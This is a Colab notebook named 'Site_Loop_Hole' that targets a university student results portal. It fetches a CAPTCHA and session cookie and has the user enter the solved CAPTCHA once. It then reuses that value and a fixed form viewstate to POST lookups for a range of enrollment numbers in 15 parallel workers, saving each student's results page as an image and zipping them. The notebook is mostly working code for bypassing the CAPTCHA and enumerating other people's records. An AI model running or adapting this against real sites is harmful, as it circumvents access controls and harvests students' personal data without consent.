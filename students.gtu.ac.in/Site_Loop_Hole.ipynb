{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "gpuClass": "standard"
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "%%capture\n",
        "!pip install imgkit wkhtmltopdf\n",
        "!wget https://github.com/wkhtmltopdf/packaging/releases/download/0.12.6-1/wkhtmltox_0.12.6-1.bionic_amd64.deb\n",
        "!mv wkhtmltox_0.12.6-1.bionic_amd64.deb /usr/bin\n",
        "!sudo apt install /usr/bin/wkhtmltox_0.12.6-1.bionic_amd64.deb\n",
        "!rm -rf Site.css fnewgtulogo.png /tmp/Styles /tmp/Images\n",
        "!mkdir -p /tmp/Styles\n",
        "!mkdir -p /tmp/Images\n",
        "!wget -O /tmp/Styles/Site.css https://www.students.gtu.ac.in/Styles/Site.css \n",
        "!wget -O /tmp/Images/fnewgtulogo.png https://www.students.gtu.ac.in/Images/fnewgtulogo.png"
      ],
      "metadata": {
        "id": "WDIOXW2fR2gE"
      },
      "execution_count": 1,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import io\n",
        "import imgkit\n",
        "import requests\n",
        "from PIL import Image\n",
        "from IPython.display import display\n",
        "from multiprocessing import Pool"
      ],
      "metadata": {
        "id": "yRrOXaVAIOQH"
      },
      "execution_count": 2,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "s = requests.Session()\n",
        "url = \"https://www.students.gtu.ac.in/Handler.ashx\"\n",
        "r = s.get(url)\n",
        "display(Image.open(io.BytesIO(r.content)))\n",
        "r.headers['Set-Cookie'][:r.headers['Set-Cookie'].index(\";\")]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 76
        },
        "id": "8Q5sonJt1YlO",
        "outputId": "b24817d9-d353-4a2c-ce23-9c2ac6dca6d8"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<PIL.JpegImagePlugin.JpegImageFile image mode=RGB size=120x40 at 0x7F0FD062C8B0>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'ASP.NET_SessionId=rrs123q3mljqesgk0ytut2pw'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 3
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        " c = \"b7ac2b\""
      ],
      "metadata": {
        "id": "lrOXyNlMw5a5"
      },
      "execution_count": 4,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "url = \"https://www.students.gtu.ac.in/\"\n",
        "\n",
        "headers = {\n",
        "    \"Host\": \"www.students.gtu.ac.in\",\n",
        "    \"Content-Length\": \"683\",\n",
        "    \"Cache-Control\": \"max-age=0\",\n",
        "    \"Sec-Ch-Ua\": \"\\\"Not A(Brand\\\";v=\\\"24\\\", \\\"Chromium\\\";v=\\\"110\\\"\",\n",
        "    \"Sec-Ch-Ua-Mobile\": \"?0\",\n",
        "    \"Sec-Ch-Ua-Platform\": \"\\\"Windows\\\"\",\n",
        "    \"Upgrade-Insecure-Requests\": \"1\",\n",
        "    \"Origin\": \"https://www.students.gtu.ac.in\",\n",
        "    \"Content-Type\": \"application/x-www-form-urlencoded\",\n",
        "    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36\",\n",
        "    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\",\n",
        "    \"Sec-Fetch-Site\": \"same-origin\",\n",
        "    \"Sec-Fetch-Mode\": \"navigate\",\n",
        "    \"Sec-Fetch-User\": \"?1\",\n",
        "    \"Sec-Fetch-Dest\": \"document\",\n",
        "    \"Referer\": \"https://www.students.gtu.ac.in/\",\n",
        "    \"Accept-Encoding\": \"gzip, deflate\",\n",
        "    \"Accept-Language\": \"en-US,en;q=0.9\",\n",
        "    \"Cookie\": r.headers['Set-Cookie'][:r.headers['Set-Cookie'].index(\";\")]\n",
        "}\n",
        "\n",
        "kitoptions = {\n",
        "  \"enable-local-file-access\": None ,\n",
        "}"
      ],
      "metadata": {
        "id": "hAvP3ge_S0VJ"
      },
      "execution_count": 5,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -rf op\n",
        "!mkdir op"
      ],
      "metadata": {
        "id": "pMS5GYHWS7yk"
      },
      "execution_count": 6,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def vtodur(enr):\n",
        "    try:\n",
        "        payload = f\"__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE1NzM5Mzk0MzkPZBYCAgMPZBYKAgkPDxYCHgRUZXh0ZWRkAgsPFgIeB1Zpc2libGVoZAINDxYCHwFoFgQCAQ88KwARAgEQFgAWABYADBQrAABkAgMPPCsAEQIBEBYAFgAWAAwUKwAAZAIRDzwrABECARAWABYAFgAMFCsAAGQCEw8WAh8BaGQYBAUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBmltZ3JlZgUJR3JpZFZpZXcxD2dkBQtncmR2TGFzdEV4bQ9nZAUFZ3JkdjIPZ2SP4LZcQwZul8DBECEWkW4aVijr8%2B7oo1NkAEpQXnjlTQ%3D%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAULuYTcS2Bbv0sXcXqDGFc4ZAOKKrbaqBuZEOgDujbIJE7faODj1tnvTzvom6kOTSTV8jFig0gbXGgleszPUj0LPOaW1pQztoQA36D1w%2F%2BbXYJy%2FQm9%2BLbhUieKyUTwFjkARq6t63XgTobACmevO6Eh&txtEnrollNo={enr}&CodeNumberTextBox={c}&btnSubmit=Search...\"\n",
        "        imgkit.from_string(requests.request(\"POST\", url, data=payload, headers=headers).text,f'/content/op/{enr}.jpg', options=kitoptions)\n",
        "    except OSError as e:\n",
        "        pass\n",
        "\n",
        "with Pool(15) as pp:\n",
        "  pp.map(vtodur,range(190280111001,190280111010+1))"
      ],
      "metadata": {
        "id": "oZ_Dorc0gTjM"
      },
      "execution_count": 8,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "%%capture\n",
        "!zip -r op.zip op"
      ],
      "metadata": {
        "id": "ZGwbqIEJijew"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "👈 download <font color='yellow'>op.zip</font> from left side bar by double clicking it"
      ],
      "metadata": {
        "id": "rmjRmivtlYK4"
      }
    }
  ]
}